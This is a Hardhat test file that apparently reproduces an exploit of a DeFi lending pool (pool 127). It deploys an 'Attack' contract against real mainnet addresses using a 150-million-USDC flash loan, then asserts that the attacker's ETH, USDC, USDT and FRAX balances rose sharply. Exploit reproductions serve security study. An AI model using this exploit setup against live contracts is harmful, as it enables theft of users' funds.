const { expect } = require("chai");
const { ethers } = require("hardhat");
const TOKEN_ABI = require("../abi/token");

describe("Attack", function () {
  before(async () => {
    const [owner] = await ethers.getSigners();

    const USDC_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
    const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
    const FRAX_ADDRESS = '0x853d955aCEf822Db058eb8505911ED77F175b99e'

    this.USDC = await ethers.getContractAt(TOKEN_ABI, USDC_ADDRESS);
    this.USDT = await ethers.getContractAt(TOKEN_ABI, USDT_ADDRESS);
    this.FRAX = await ethers.getContractAt(TOKEN_ABI, FRAX_ADDRESS);

    expect(await ethers.provider.getBalance(owner.address)).to.be.equal(ethers.utils.parseUnits("10000", 18));
    expect(await this.USDC.balanceOf(owner.address)).to.be.equal(ethers.utils.parseUnits("0", 6));
    expect(await this.USDT.balanceOf(owner.address)).to.be.equal(ethers.utils.parseUnits("0", 6));
    expect(await this.FRAX.balanceOf(owner.address)).to.be.equal(ethers.utils.parseUnits("0", 18));
  })

  it ("Exploit", async function () {
    const attackFactory = await ethers.getContractFactory("Attack");
    const attack = await attackFactory.deploy();

    await attack.attack(
      "0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F",  // Unitroller
      "0x26267e41CeCa7C8E0f143554Af707336f27Fa051",  // fETH-127
      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",  // Flashloan Token(USD Coin)
      ethers.utils.parseUnits("150000000", 6),       // Flashloan Amount
      [
        "0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47",  // fUSDC-127
        "0xe097783483D1b7527152eF8B150B99B9B2700c8d",  // fUSDT-127
        "0x8922C1147E141C055fdDfc0ED5a119f3378c8ef8",  // fFRAX-127
      ]
    )
  })

  after(async () => {
    const [owner] = await ethers.getSigners();
    expect(await ethers.provider.getBalance(owner.address)).to.above(ethers.utils.parseUnits("11977", 18));
    expect(await this.USDC.balanceOf(owner.address)).to.above(ethers.utils.parseUnits("7144266", 6));
    expect(await this.USDT.balanceOf(owner.address)).to.above(ethers.utils.parseUnits("132959", 6));
    expect(await this.FRAX.balanceOf(owner.address)).to.above(ethers.utils.parseUnits("776937", 18));
  })
});